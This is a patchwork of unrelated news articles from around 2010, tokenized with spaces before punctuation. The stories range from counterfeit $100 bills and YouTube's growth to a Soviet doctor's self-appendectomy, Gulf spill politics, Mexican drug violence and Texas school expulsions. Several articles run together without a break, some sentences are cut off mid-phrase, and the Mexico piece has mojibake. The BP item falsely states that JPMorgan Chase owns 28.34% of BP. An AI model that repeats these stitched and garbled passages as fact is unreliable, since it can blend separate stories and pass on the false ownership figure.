With well over a half trillion dollars in " Benjamins " in circulation around the world , the existing $ 100 bill has attracted the attention of countless counterfeiters .
Most have been sophisticated criminal gangs , but there 's also a considerable ( if controversial ) body of evidence linking the most realistic and dangerous counterfeits — the so - called supernotes — with the North Korean government .
These twin threats , more than anything else , have driven this latest eye - popping change to our money supply .
If history is any guide , it wo n't be the last .
Paper money in this country has followed a familiar trajectory : new designs , new dollars and , eventually , new counterfeits .
It 's perhaps appropriate that Benjamin Franklin appears on the most valuable denomination of dollar in circulation .
He designed the country 's first money : the Continental dollars issued during the American Revolution to pay the costs of the war .
Franklin did n't put his own head on the currency ; rather , he used a mysterious anticounterfeiting device he had devised several decades earlier .

YouTube wants users to discover and shape the world through video Video sharing website YouTube now gets more than two billion hits daily .
That 's nearly double the number of people who tune into the US 's three prime time TV stations combined , its owners Google have said .
The news comes as the site celebrates the day five years ago when the first beta version of YouTube was launched .
" I see this great growth opportunity in the online video market and we are positioning ourselves to be a leader , " co-founder Chad Hurley told BBC News .
" We are a stage and we give everyone in the world an opportunity to participate and that is being a video platform for creating a solution for people to not only upload and distribute their videos on a global basis but to find and share videos . "
He also said that while the two billion hits a day marked a real milestone " I feel we have much further to go .
From cat videos to political videos to " how to " videos to entertainment - that is YouTube
Chad Hurley , YouTube co-founder " Two billion video streams is a large number but on average people are only spending 15 minutes a day on the site compared to five hours a day watching TV .
" I do n't think we could have ever planned or imagined we would get to the scale or the size we are today .
We were mostly trying to create a video solution for ourselves based on our own frustrations .
We are proud of what we have achieved so far but we have a lot of work ahead , " said Mr Hurley .
The site was bought by Google near the end of 2006 for $ 1.65 bn .
Just seven months ago it clocked up one billion downloads a day .
The early years
The slogan for YouTube is " Broadcast Yourself " which Mr Hurley said was a play on " be yourself and also captured in my mind the essence of the site which was to let people express themselves . "
The first person to express themselves on the platform was fellow co-founder Jawed Karim who posted a 19 seconds long video called " Me at the Zoo " .
It was uploaded on April 23 , 2005 and can still be viewed on the site .
Please turn on JavaScript .
Media requires JavaScript to play .
Among the other videos that have made YouTube history is that of a wounded girl dying in front of a crowd during the Iranian election protests , a YouTube interview with President Barack Obama , Ronaldinho 's Nike advert and singer Susan Boyle 's performance on Britain 's Got Talent competition on TV .
" We wanted to create a level playing field that gave everyone that ability to be seen and heard , " said Mr Hurley .
" Maybe early on people only recognised us or explained YouTube by placing it in a box but there are so many people on our site and we receive so much content over a 24 hour period , it can't be about one thing .
December 2005 8 million videos watched a day January 2008 10 hours of video uploaded every minute October 2009 1 billion views per day March 2010 24 hours of video uploaded every minute " And so from cat videos to political videos to " how to " videos to entertainment - that is YouTube , " added Mr Hurley .
Today it hosts channels for everyone from Queen Elizabeth to the Pope and from President Barack Obama to the Iraqi government .
" You Tube really is a phenomenon and is very much part of popular culture , " said Catharine P Taylor , media blogger at news website BNET.com .
" It really is a game changer because it gives everybody a platform to broadcast from .
There are many examples where an average citizen has become a big hit on YouTube and that is something that would have been impossible to contemplate five , six years ago . "
The future
In those early days the site was known for hosting pirated snippets of TV shows or movies .
Even today material gets pulled from the site because of issues over copyright .
" They have made a lot of progress about weeding out illegal content , " said Allen Weiner senior vice president of research at Gartner .
YouTube 's front page was a very sparse looking one five years ago " They are serious about it .
Their future depends on it . "
As a result YouTube has been working hard to win over content makers as it modifies its service to stream professional films and cash in on a trend towards internet television .
Industry watchers have said YouTube could possibly become part of the Google " media cloud " where people can access films , books , magazines tv shows and other digitised content .
" You Tube is going to change in a lot of ways in the next few years , " Ryan Lawler of video site NewTeeVee.com told BBC News .
" I think we will see it on more devices and see it used more for live streaming .
There are real opportunities for it to become a traditional content distributor like the cable channels .
YouTube streams make up around 40 % of all online video watched in the US , so there is massive scale there and lot of opportunity . "
Analysts have predicted that while the site has struggled to reach profitability since its creation , 2010 could be its year .
Bloomberg News pointed out that the biggest challenge facing YouTube advertising is what makes it so popular - its user generated content .
Many advertisers are wary of placing adverts that might run next to videos that might also offend or upset the audience .
" Obviously we want to work with everyone and show the value we can bring on multiple levels .
It could be as simple as marketing a movie or show to our users and driving those audiences to another place for the experience .
" We are trying to create opportunities for everyone and this is not just about making big deals with major networks , " said Mr Hurley .

Ingabire was released after being summoned to a Rwandan police station yesterday , much to the relief of her supporters , but this morning both she and the Rwanda News Agency ( RNA ) reported that Erlinder had been arrested and charged with " genocide ideology , " a speech crime unique to Rwanda which Human Rights Watch , Amnesty International , and even the U.S. State Department have denounced as a tool of political repression .
Erlinder , a prominent critic of Rwandan President Paul Kagame 's regime , and of the received history of the Rwanda Genocide , had traveled to Kigali after attending the Second Intetnational Criminal Defense Lawyers ' Conference in Brussels .
State run Rwandan media have attacked Erlinder since his arrival and the Rwandan News Agency report that he is now in custody and being interrogated at the Rwandan Police Force ’s Kacyiru headquarters .
The RNA also reports that the American embassy in Kigali have taken up the matter , but it is not yet clear in what form .
The Embassy is located just meters away from the police headquarters .
Before leaving for Bruxelles and then Kigali , Erlinder notified the U.S. State Department , his Minnesota Congressional Representative Keith Ellison , and Minnesota Senators Al Franken and Amy Klobuchar Erlinder bases his critique of the Kagame regime and the received history of the 1994 Rwanda Genocide on the evidence collected in his Rwanda Documents Project
A NEW political grouping concerned with green and social justice issues adopted a constitution at a meeting in Dublin at the weekend .
An Fís Nua or A New Vision , is to register as a political party within weeks and will campaign for seats in the next general and local elections .
Backed largely by former members of the Green Party , the new grouping said it will be concerned with issues like transparency in politics , use of the State ’s natural resources , environmental issues and care for the less well off .
The two - day meeting in Parnell Square was attended by former Green Party MEP Patricia McKenna and ex-Green Party councillor Pat Kavanagh of Wicklow town as well as members of the Donegal Greens which recently disaffiliated en masse from the Green Party .
David Grey of Tralee , a former candidate for the party , advocate for the disability sector and founder member of GM Free Kerry also supports the new group , but said he could not attend the weekend meeting .
Speaking after the meeting , Ms Kavanagh said the weekend had considerably moved the agenda forward for the new party , which she likened to “ a federation ” .
She said membership would be open to individuals , but also to organisations which wanted to retain their separate identity while aligning with An Fís Nua .
“ It is a federation with a political structure with a view to fielding candidates in the next local and general elections , ” she said .
There is to be no single leader of the new party , in similar fashion to the original Green Party policy , and spokespeople for the party will be elected by the membership .
Acknowledging the grouping was “ based on the same principles ” generally as the Green Party , she believed “ a lot of people were not happy with the party in Government ” , which she said “ abandoned ” many core issues .
Ms McKenna said the issues concerned natural resources like the Corrib Gas field .
She said it should be possible for the Government to tell the oil companies it was altering the terms of their agreements .
Ms McKenna also said the new grouping would attract support from the Labour Party , particularly after that party ’s stance on animal welfare legislation .
Cork councillor Chris O’Leary , a former Green Party councillor said he met the backers of the party , but was “ concerned about the amount of people close to John Gormley who come to these meetings ” .

IT IS the dream that will not die : Melbourne to Sydney by train in four hours , instead of the current 11 ½ hours .
Today , Greens Leader Bob Brown will launch a campaign at Southern Cross Station for a major concept study into a high - speed rail link between Australia 's two biggest cities , which his office has costed at $ 40 billion .
This follows the launch in January of a ' ' pre - feasibility ' ' study by the Cooperative Research Centre for Rail Innovation , which examined a plan to cover the 900 - kilometre Sydney - Melbourne route by train at an average 280 km / h .
Mr Brown said a high - speed rail link was needed to provide '' fast , reliable transport for 75 per cent of our population … [ And it ] would also generate thousands of jobs and promote regional development . ''
He called on the Rudd government to fund a $ 10 million one - year planning study .
In a life - or - death situation , human beings are capable of incredible feats of bravery and .
One of the most remarkable ever recorded was that of Leonid Rogozov , the medic at a Soviet Antarctic research station who was forced to remove his own appendix .
I write about the incident at some length in Extreme Fear ; to my delight , I 've discovered that Rogozov 's son has recently published a paper providing even more details on the case .
The more I learn , the more incredible it seems .
During the late ‘ 50s and early ‘ 60s , the Cold War took on new and more literal meaning as the United States and Russia expanded their rivalry into the heart of Antarctica .
For the small crews eking out the winter in remote stations were more isolated than if they had been in outer space : once the winter darkness descended , they would be completely isolated for months , with no way for anyone to get in or out .
Rogozov , then 27 , had come to Antarctica in 1961 as part of the Sixth Soviet expedition , which established his nation 's third base on the continent , the Novolazarevskaya Research Station .
On April 29 , with the autumnal nights quickly getting longer and a fierce storm raging all around , Rogozov began to feel ill .
He woke up that morning feeling lethargic , and got weaker as the day went on .
He became more and more nauseous .
A faint pain in the upper part of his abdomen grew and shifted to the lower right part of his belly .
He started running a fever .
The diagnosis was obvious : he was suffering from acute appendicitis .
Left untreated , the infection would weaken and swell the lining of his intestine until it catastrophically ruptured , flooding the internal cavity of his abdomen with feces and pus and swamping his bloodstream with toxins .
Death would be inevitable , and agonizing .
The new paper by Rogozov 's son quotes the elder 's diary :
" I did not sleep at all last night .
It hurts like the devil !
A snowstorm whipping through my soul , wailing like a hundred jackals .
Still no obvious symptoms that perforation is imminent , but an oppressive feeling of foreboding hangs over me . . .
This is it . . .
I have to think through the only possible way out : to operate on myself . . .
It 's almost impossible . . . but I can't just fold my arms and give up . "
Rogozov took medicine to fight the infection , but the next day his condition deteriorated .
His fever soared and he vomited repeatedly .
The pain was getting worse .
He knew that conditions were ripening for a fatal rupture .
" An immediate operation was necessary to save the patient 's life , " Rogozov later wrote .
" The only solution was to operate on myself . "
The doctor had no evidence that such a feat was possible .
If he failed , he would certainly die .
To get him through , he would have to rely on nothing more than local anaesthesia and willpower fortified by necessity .
Gathering the other members of the station , Rogozov laid out a plan .
Two atmospheric scientists would be in charge of sterilizing the surgical equipment .
A driver would stand next to the doctor during the operation and hold a mirror so that he could see inside his abdominal cavity .
A meteorologist would hold the retractors to keep the incision open .
Rogozov showed them how to inject him with drugs in case he lost consciousness , and to administer artificial respiration .
The operation began at 10 o'clock at night .
Rogozov , dressed in a surgical gown and mask , lay inclined on the operating table , angled to the side so that most of his weight was on his left hip .
First he injected a solution of novocaine , a local anaesthetic , into his abdomen just above the infected appendix .
Once the painkiller took effect , he asked one of assistants for a scalpel and made a five - inch incision .
Working by feel , he cut through skin , muscle , and fat tissue , and then used the mirror to watch the knife as he came to the delicate business of exposing the peritoneum , the membrane that surrounds the internal organs .
After half an hour he felt weak and dizzy , and had to stop for a rest .
Pressing on , he located the appendix , a thumblike from the intestine , and found that it had developed a perforation an inch across .
One of Rogozov 's colleagues wrote :
" When Rogozov had made the incision and was manipulating his own innards as he removed the appendix , his intestine gurgled , which was highly unpleasant for us ; it made one want to turn away , flee , not look - but I kept my head and stayed .
Artemev and Teplinsky also held their places , although it later turned out they had both gone quite dizzy and were close to fainting . . .
Rogozov himself was calm and focused on his work , but sweat was running down his face and he frequently asked Teplinsky to wipe his forehead . . . "
out the diseased tissue , Rogozov doused the surrounding area with antibiotics and sewed the wound shut .
The whole operation had taken a little less than two hours .
Rogozov 's willpower had pulled him through .
He had survived .
Afterward , Rogozov looked back on what he had accomplished :
" I did n't permit myself to think about anything other than the task at hand .
It was necessary to steel myself , steel myself firmly and grit my teeth .
I was scared .
But when I picked up the needle with the novocaine and gave myself the first injection , somehow I automatically switched into operating mode , and from that point on I did n't notice anything else . "
At first , the doctor 's condition was quite poor , but as the days went by he improved quickly .
After five days his temperature was back to normal and the inflammation in his belly had subsided .
A week after the operation he removed the stitches , and a week after that he was back at work .
A photograph taken after his recovery shows his seated on a snowbank next to a penguin , smiling and looking hearty :

As the public grows frustrated with Obama 's oil spill response , environmental groups remain quiet .
Enviros give Obama a pass on spill
Last week , it seemed , environmentalists were finally ready to let loose on President Barack Obama over the Gulf oil spill .
Actress Q’orianka Kilcher chained herself to the White House fence while her mother slathered the “ Pocahontas ” star in black paint meant to look like oozing crude .

Kilcher ’s cause ?
Not the Gulf spill at all but oil - related abuses of indigenous people in Peru , whose president was visiting Obama that day .
As the greatest environmental catastrophe in U.S. history has played out on Obama ’s watch , the environmental movement has essentially given him a pass — all but refusing to unleash any vocal criticism against the president even as the public has grown more frustrated by Obama ’s performance .
About a dozen environmental groups took out a full page ad in the Washington Post Tuesday — not to fault Obama over the ecological catastrophe but to thank him for putting on hold an Alaska drilling project .
“ We deeply appreciate your decision .
... ” the ad says to Obama .
President Obama is the best environmental president we ’ve had since Teddy Roosevelt , ” Sierra Club chairman Carl Pope told the Bangor Daily News last week .
“ He obviously did not take the crisis in the Minerals Management Service adequately seriously , that ’s clear .
But his agencies have done a phenomenally good job .
Some say there ’s little doubt that if a spill like the one in the Gulf took place on former President George W. Bush ’s watch , environmental groups would have unleashed an unsparing fury on the Republican in the White House .
For their liberal ally , Obama , they seem willing to hold their tongues .
These guys have bet the farm on this administration , ” said Ted Nordhaus , chairman of an environmental think tank , the Breakthrough Institute .
“ There has been a real hesitancy to criticize this administration out of a sense that they ’re kind of the only game in town . …
These guys are so beholden to this administration to move their agenda that I think they ’re unwilling to criticize them .
The most prominent voices of outrage have come not from mainstream environmental groups , but from the likes of political consultant James Carville , comedian Bill Maher and Plaquemines , La. , Parish President Billy Nungesser .
Carville ’s call for Obama to hold BP ’s feet to the fire has penetrated the national consciousness in a way that comments from traditional environmental groups have not .
' Who ’s your daddy ? ’ has become the talking point of the crisis so far , ” observed Matt Nisbet , a professor of environmental communications at American University , referring to a comment by Carville .
“ It ’s difficult for the national environmental groups to be critics of the administration — they ’re working so closely with the administration .
...
They have reacted cautiously and softly . "
The White House says Obama has escaped the brunt of environmentalists ’ criticism over the spill and the cleanup effort for a simple reason : he does n’t deserve it .
“ We have responded with unprecedented resources , and when you look at what most of the critics say … and you ask them , specifically , what is it that the administration could or should have done differently that would have an impact on whether or not oil was hitting shore , you 're met with silence , ” Obama said in an interview aired Tuesday on NBC ’s “ Today Show . ”
But analysts say it ’s more complicated than that — a practical sense among the groups that Obama is about the best they ’re going to do when it comes to their key issues .
The environmental movement as such has nowhere to turn but Obama , ” said Douglas Brinkley , a presidential historian at Rice University .
“ They ’re feeling they have one person to do business with .
...
We ’re down to like two Republican senators who want to deal with these environmental groups . ”
There is a level of confusion , ” said Michael Egan , an environmental historian at McMaster University in Ontario .
“ Part of it is they ’re still trying to figure out how to work with the Obama administration , which is sounding more and more like a Clinton one — much to their chagrin . ”
While they ’re disappointed by a variety of Obama ’s actions , the alternatives are much , much worse , ” Egan said .
Several analysts said the low profile of the large environmental groups since the disaster is due in large part to uncertainty about the impact of the spill on the strategy for passing pending climate legislation .
Environmental groups are leery of alienating Obama as he weighs how hard to push a sweeping cap - and - trade energy bill to rein in carbon emissions blamed for global warming .
Obama implicitly blessed a drilling - for - climate - votes swap back in March when he announced plans to open additional areas in the Gulf , along the Atlantic coast , and in Alaska for offshore drilling leases .
Most environmental groups publicly opposed that move , but some accepted the White House ’s analysis that allowing more drilling was the best way to win the Republican support needed to pass a climate change bill this year .
“ Obama made his ... pledge to lift the offshore drilling ban because he was trying to rustle up votes for Kerry - Lieberman , and that ’s what most of the environmental community has been about , ” Bill McKibben , a prominent environmental writer and leader of climate change group 350.org , said this week .
The major environmental groups insist they have been actively trying to harness public anger over the spill .
However , they concede they have n’t had the kind of media traction Carville and others voices not usually associated with the environmental debate have found .
“ We ’ve been very vocal about the spill since it started .
We ’ve been doing field events all over the country at BP gas stations , ” said Dave Willett of the Sierra Club .
“ I obviously do n’t think we ’ve had the profile Carville has had .
…
An environmentalist being against offshore drilling is n’t exactly a man - bites - dog kind of angle . ”
Asked if Sierra Club has any concerns about the administration ’s response to the spill , Willett said , “ Overall , we ’re satisfied with the cleanup and recovery effort . "
A spokesman for the Natural Resources Defense Council , Bob Deans , said there ’s no need for his group to whip up anger over the spill — recent photos of birds coated in oil have done that just fine .
“ I think that made people plenty angry .
Every time you see a picture like that , it breaks your heart , ” Deans said .
“ Certainly , we ’re outraged , but it ’s not our job to generate outrage .
It ’s our role to try to focus that sentiment on priorities we need to make our country stronger . ”
Some say that even though environmental groups are n’t dominating the debate , their issues certainly are — and are driving huge swings in public opinion against drilling and in favor of action on climate issues .
“ In some ways , the media coverage is doing a lot of the work for the environmental groups , ” Nisbet said .
“ They have a perfect narrative going right now .
… The lower profile is working for them . ”
As the criticism of Obama ramped up in the media last month , some protesters did challenge his handling of the crisis — but they often came from groups not commonly associated with environmental causes .
The “ Make Big Oil Pay ” signs outside a fundraiser Obama attended in San Francisco on May 25 were carried by a contingent from the socialist group ANSWER ( Act Now to Stop War and End Racism ) , which is mounting a campaign to have the U.S. government seize BP ’s assets .
“ The national environmental organizations have become very establishment , very hierarchical and have close ties to decision makers .
A lot of their influence is based on their reputations , their expertise and their ability to marshal mainstream members , ” Nisbet said .
“ Groups outside the mainstream are benefitting . "
So far there has been one modest spill - related protest directed at the White House .
On May 11 , before significant criticism of the administration got attention , about 50 people marched outside with a banner calling the spill Obama ’s “ Crude Awakening . "
“ There is , I think , a tendency of waiting , ” said one leader of that demonstration , Rev. Lennox Yearwood of the Hip Hop Caucus , who attributed some of the sluggishness to most environmentalists being political supporters of the president .
“ As people were waiting , they were outraged but they were waiting for something to happen .
When it did n’t , I think a lot of groups and people said , ‘ What is going on ? ’ ”
Yearwood said the White House should have had “ a higher sense of urgency early in the process . ”
And he said his group is planning more demonstrations to make sure Obama keeps up the pressure on BP and leads a drive to reduce America ’s dependence on oil .
“ We ’re going to be at the gates again being angry as hell , ” he said .
“ We have to speak truth to power , no matter who that power is . ”
The GOP ’s California Nightmare
Doug Mataconis · · 19 comments
The polls in California close in about seven hours , but already Republicans are worried that a combination of low turnout and a quirky electorate could put the queen bee of the birther movement on the ballot in November :
California Republicans optimistic about their prospects in November could find themselves with a bit of a problem after the votes are counted in Tuesday ’s primaries — a statewide ticket with the so - called “ Birther Queen ” as one of their candidates .
Orly Taitz is an Israeli émigré who has spent the past two years filing lawsuits challenging President Barack Obama ’s right to be president on the grounds that he was born in Kenya .
In the process , she has earned herself $ 20,000 in court fines .
Now she ’s running for the GOP nomination for secretary of state , and with her establishment - backed primary opponent mounting a less - than - stellar campaign against her , operatives say there ’s a chance she could win .
“ It ’d be a disaster for the Republican party , ” says James Lacy , a conservative GOP operative in the state .
“ Can you imagine if [ gubernatorial candidate ] Meg Whitman and [ candidate for Lt. Gov. ]
Abel Maldonado — both of whom might have a chance to win in November — had to run with Orly Taitz as secretary of state , who would make her cockamamie issues about Obama ’s birth certificate problems at the forefront of her activities ? ”
“ There is no Republican candidate for statewide office that would be willing to have her campaign with them , ” says Adam Probolsky , a spokesman for the Orange County Republican Party .
Indeed , but if Taitz were to somehow pull off a victory today she would become the poster child for every Democrat running against every Republican across the country .
And the birthers , who have fortunately mostly retreated into the dark spaces of American politics , would be handed an inadvertent victory that would only serve to energize them once again .
How likely is it that Taitz could win ?
It ’s hard to say mostly because nobody polls the down - ballot races in California and Taitz ’s opponent has chosen not to run an aggressive campaign against her .
The Washington Post ’s Dave Weigel outlined how it could happen earlier today :
Republican voters , brought out in sizable numbers by the contested primaries for governor and U.S. senator , fill out the rest of their ballot with progressively less information about their candidates .
They know Taitz ’s name from … somewhere .
And she ’s listed first on the ballot , thanks to the state ’s randomized ranking system .
( Some of these voters , of course , will know and avidly support her . )
She ’s identified on the ballot as an attorney , while Dunn is a real estate agent .
They check off her name , and she wins .
On the other hand , Taitz has raised almost no money in this race , although how much that matters in a contest like that is unclear .
In the meantime , the Field Poll predicts that no more than one - third of the state ’s voters will vote today .
So , as Weigel says , Taitz could lose this in landslide or win it in squeaker , thus creating weeks of bad press for Republicans in California and beyond .
If you do n’t think that people in Washington and Sacramento are going to be watching this race when the polls close at 11 pm EDT , you ’re kidding yourself .

CIUDAD JUAREZ , Mexico Ã¢â‚¬â€œ Mexico ’s bloody drug wars saw a new spasm of killings late Saturday into Sunday , with 25 people fatally shot in the northern state of Chihuahua bordering the United States .
Seven of the deaths occurred in violence - plagued Ciudad Juarez , Mexico ’s murder capital , bringing to 62 the number of people killed in the city over the past week .

The 18 other slayings overnight included four people fatally shot by automatic weapons fire in a bar in the town of Camargo , near the state capital Chihuahua City , and two women whose bodies were found stuffed in the trunk of an abandoned car in the same town , prosecutors said .
So far this year , more than 850 people have been killed in Ciudad Juarez , a city of 1.3 million , while more than 2,660 were killed there in 2009 , according to official figures .
Mexican President Felipe Calderon visited Ciudad Juarez in February and apologized to numerous grieving families who lost loved ones in a January massacre that claimed the lives of 15 children and teens .
The president admitted that his three - year crackdown on crime with more than 50,000 troops spread across the country “ is not enough , ” and vowed to redesign a new strategy against crime and violence with community cooperation .
To the east in the northern Mexican city of Monterrey early Sunday , three men and two women were trampled to death when some 10,000 people at an outdoor concert stampeded after three shots were fired , presumably in the air , by somebody at the fairground , local officials said .
Another 30 people were treated for injuries from the jostling , they added .

Moments before the gunshots , the crowd appears to have been primed for panic when shouts “ hit the ground ” and “ gunfight ” were heard , witnesses told the Mexican newspaper Reforma .
Monterrey , in Nuevo Laredo state that also borders the United States , has seen a spike in gang violence pitting the Guf of Mexico and Los Zetas drug cartels , officials said .
Authorities blame the northern Mexico violence on a battle for control of key drug trafficking routes into the United States .
Former Mexican Foreign Minister Jorge CastaÃƒÂ±eda , now a professor at New York University , has argued that because the drug cartels derive at least 60 percent of their funding from the illegal cultivation , smuggling and sales of marijuana in the United States , both countries should consider a path toward legalization .

“ I think what CalderÃƒÂ³n and the United States should do is to sort of sit back for a second , think this through , see what they really want to achieve , what is achievable and what should be done that ’s new , ” he said .
“ For example , there are more and more states in the US that are moving towards decriminalization at least of marijuana .
Mexico is still a very important producer of marijuana .
Some people say that up to 60 percent of the profits of MexicoÃ¢â‚¬â „ ¢s cartels come from marijuana .
“ Well , if the United States or CaliforniaÃ¢â‚¬â „ ¢s de facto legalizing it through medical marijuana , what sense does it make for Mexicans to die to stop marijuana from entering the US when once it enters it can be sold legally at over 1,000 dispensaries in Los Angeles , more than the number of public schools there are in Los Angeles . ”

The sentiment has been echoed by numerous U.S. officials , including Arizona Attorney General Terry Goddard , who said that while he ’s not in favor of legalization , he ’d like to see the issue debated .
Goddard added that calls to legalize marijuana as a way of fighting the cartels are “ a strong argument ” for taking the first steps toward ending “ the devastation in Mexico . ”
“ If we ca n’t stop it in Mexico , we ’re gonna end up with violence in the United States and none of us want that , ” he warned .
California Governor Arnold Schwartznegger has also welcomed the debate , prompting California voters to organize a ballot initiative on legalization that is to be voted upon later this year .

Fifty - six percent of Americans want marijuana laws brought in line with or made less severe than those governing the sales and consumption of alcohol , according to an Associated Press / CNBC poll released on April 20 .
More than 22,700 people have died across Mexico in suspected drug violence since the end of 2006 , despite a government - ordered nationwide crackdown involving the deployment of troops and police .

In the wake of the Gulf of Mexico oil spill , BP ’s stock value has plummeted , prompting news stories identifying the company ’s largest investors .
Oddly enough , some media outlets have failed to identify the largest BP shareholder : the U.S. investment firm JPMorgan Chase .
According to the European financial database
, JPMorgan Chase is the No. 1 holder of stock in BP .
That distinction also has earned the Wall Street bank the title of “ Global Ultimate Owner ” of the oil giant , as it owns 28.34 % of BP .
Next , at 7.99 % , is Legal and General Group , a British - based financial services company with assets of more than $ 350 billion .
Another U.S. investment firm , BlackRock Inc. , owns 7.1 % of BP .
Other owners include the governments of Kuwait , Norway , Singapore and China .
When it comes to discipline , the Aldine Independent School District does n’t mess around .
The large suburban district expelled more students last year — 525 — than any other district in Texas , despite being a fraction of the size of large urban districts , according to state data .
Aldine boots nearly three times as many students as neighboring Houston ISD — which expelled 181 students in 2008 - 09 — even though its enrollment , about 67,000 , is only a third the size .
The forced - out students get processed into either the Harris County Juvenile Justice Alternative Education Program or one of two “ very strict ” special schools run by the Harris County Department of Education , an unusual agency that provides services to area districts but runs no schools for the general public , according to agency spokeswoman Carol Vaughn .
An additional 1,399 students were shipped off to a district alternative program — not technically expelled but removed from traditional classes .
Aldine is cited as a particularly striking example of the criminalization of school discipline in The School - to - Prison Pipeline , a report to be released this morning by Texas Appleseed , a nonprofit research and advocacy group focusing on social and economic justice .
“ The ‘ pipeline ’ refers to a disturbing pattern of school disciplinary problems escalating from suspension to removal from school , juvenile justice system involvement , and school dropout , ” the report asserts .
“ Numerous studies by national experts … have established a link between school discipline , school dropout rates and incarceration .
…
More than 80 percent of Texas adult prison inmates are school dropouts . ” ( emphasis in original )
It ’s unclear why Aldine — which recently won a prestigious national award — pushes so many of its students out of traditional classrooms .
District officials did not respond to a request for comment Tuesday .
State data listing reasons for all district disciplinary actions , not just expulsions , showed 289 students disciplined for drug possession but just six instances of “ conduct punishable as a felony . ”
By state mandate , such Juvenile Justice Alternative Education Programs operate in every Texas county with more than 125,000 people .
They operate under a variety of philosophies , from “ therapeutic ” ( more expensive and thus not common ) to “ boot camp ” ( more common but increasingly out of vogue ) .
And they ’re often a prelude to deeper and more troubling involvement in the justice system , according to Texas Appleseed .
The group 's 114 - page report paints a bleak portrait of the problems resulting from three different varieties of expulsions .
Those that send students to the state - monitored , county - run juvenile justice programs are the most consistently effective , though still problematic to the researchers .
A less effective variety of school banishment comes in the form of district - operated and state - mandated District Alternative Education Programs , which nonetheless are better than still - common expulsions “ to the street , ” said the report ’s primary author , Deborah Fowler .
The report further explores what it calls two troubling trends : the high number and proportion of “ discretionary ” expulsions by districts — often for low - level or simply unclear reasons such as “ serious or persistent misbehavior ” — and the disproportionate severity of discipline meted out to minority students , particularly African - Americans .
In Aldine , of 570 total expulsions last year ( some students were expelled more than once ) , 530 were discretionary .

Statewide last year , 8,202 students were expelled , and 5,806 of them , about two - thirds , were disciplined for “ discretionary ” reasons decided by local school systems .
Half of those discretionary expulsions involved students already in district alternative programs and were catalogued in the hazy category of “ serious and persistent misbehavior , ” according to the Texas Appleseed report .
Moreover , some Texas counties are prosecuting such students — those booted from alternative programs for ill - defined “ misbehavior ” — as criminal offenders , using a designation in the family code called Conduct in Need of Supervision .
“ Such prosecution brings juveniles under court or probation oversight even though they have not broken the law — and is the most obvious example of the criminalization of low - level student behavior problems , ” the report states .
“ They ’re being treated like they ’ve committed a crime when maybe they ’ve just been disruptive in class , ” Fowler said in an interview .
“ And that increases the likelihood that they will penetrate the criminal justice system further . ”
And that system , often as not , is being populated with minority students committing low - level offenses .
When Texas Appleseed pointed to that disparity in an earlier report , it ignited a backlash claiming the statistics did not prove discrimination — but rather that minority students simply commit more offenses warranting expulsion , Fowler said .
So this time , researchers took a finer cut of the data to explore the issue further .
What it found , Fowler said , tended to throw cold water on the backlash .
When looking only at mandatory expulsions — those for serious “ zero tolerance ” offenses outlined clearly in state law , such as weapons incidents , drug - dealing and sexual assaults , African - Americans are expelled in proportions equal to their overall proportions of enrollment .
But when researchers probe data on discretionary expulsions — for less serious offenses involving judgment calls by districts — the proportion of African - American student expulsions rises sharply .
Indeed , the more subjective the criteria , the more African - Americans get expelled .
Black students accounted for 14 percent of the state ’s mandatory suspensions , exactly matching the percentage of all black students .
That figure rises to 22 percent when only discretionary expulsions , involving subjective decisions , are examined .
And in the most subjective category of discretionary expulsions , for “ serious and persistent misbehavior , ” black students account for 31 percent — more than double their presence in the student body at large .
The data on Hispanic students shows a different , in some ways opposite , trend .
They are overrepresented moderately in the discretionary expulsions — 52 percent compared with 47 percent of total enrollment — but represent an even higher proportion of less subjective mandatory expulsions : 66 percent , according to the report .
Texas Appleseed tracks much of the current system back to a wholesale rewriting of Texas education law in 1995 , which included several “ zero tolerance ” policies and the mandate for juvenile justice education programs in larger counties and for alternative programs for the expelled in every school district .
The district - run programs — sometimes run in - house , sometimes outsourced to private companies — vary widely in quality and are not well monitored by the Texas Education Agency , Fowler said .
Though not technically expelled , the students in practice are removed from a traditional setting and concentrated in schools or programs for the ill - behaved , which can become dropout factories .
And they ’re being booted in huge numbers : Nearly 100,000 students now reside in district alternative programs , or enough to pack the Texas Longhorns ' football stadium in Austin .
TEA spokeswoman Debbie Ratcliffe conceded that the district alternative schools in some places fail , and that the agency faces a challenge in monitoring their quality .
“ Like school themselves , they vary in quality .
Some are set up as separate schools ; others are programs in a larger schools .
How they get monitored depends largely on how they are set up .
We do have an ‘ at - risk monitoring system , ’ where some are more likely to get a visit from us , depending on their data , ” she said of the stand - alone alternative campuses .
“ The chapter in state law that governs these school is a real jumble , and we ask the Legislature to smooth it out every session .
But these schools do have value .
Without them , many of these kids that get expelled would just be out on the street . ”
In Aldine ISD , students cited for the most serious offenses , under mandatory state zero - tolerance policies , end up in one of two schools managed by Henry Gonzales , deputy director of the Harris County Juvenile Probation Department , which takes in offenders from 22 school districts .
Of 27 such programs in the state , Harris is one of just four that take a “ therapeutic ” approach , which costs more and employs professionals in social work , drug treatment and mental health .
Gonzales sees just a fraction of the expelled from Aldine , but the total number of students from all local districts has fallen to the point where he plans to close one of his two schools — good news in his business .
“ We ’re getting more serious violators than in the past , ” he said .
“ Districts are getting more discretion and using more discretion .
They ’re holding on to more of their kids and dealing with them in traditional settings . ”
Ironically , Gonzales believes the students he sees , expelled under zero - tolerance policies , are easier to handle than students those shipped to other facilities for lesser , discretionary offenses .
About half of them are currently enmeshed in the court system .
“ You can hold something over their head , ” he said , meaning the threat of serious criminal punishment .
“ With the discretionary kids , who are in there for ‘ persistent misconduct , ’ they ’re really a little more of a challenge . ”
The revelation that an Australian soldier serving in Afghanistan may have overdosed on drugs comes as no surprise to addiction experts .
One even says a risk of sending soldiers to Afghanistan is that some of them are going to become heroin dependent .
A senior lawyer is set to conduct an official inquiry into how the experienced Australian commando suffered a suspected overdose nearly a week ago .
A bottle of pills and white powder were found in the soldier 's room .
He was found unconscious and unresponsive in his room in Tarin Kowt in Uruzgan province last Friday and remains in a serious condition in a military hospital in Germany .
Australian soldiers already face random drug testing , but now there will be testing of the entire Special Operations Task Force in Afghanistan .
Dr Alex Wodak , director of the Alcohol and Drug Service at St Vincent 's Hospital in Sydney , says drug use was a major problem for Soviet troops in Afghanistan and the US military is also now facing an increase in addiction .
He says many soldiers turn to drugs simply to cope with life in a war zone .
" Life is unbearable , " he said .
" You do n't know whether you 're going to be alive in 10 minutes ' time or not .
" Life has very few pleasures ; you 're very uncomfortable , it 's either very hot or very cold , the food 's pretty awful , the ever - present smell of death and you see some of your closest buddies die before your eyes .
" So life is really unbearable and heroin 's cheap . "
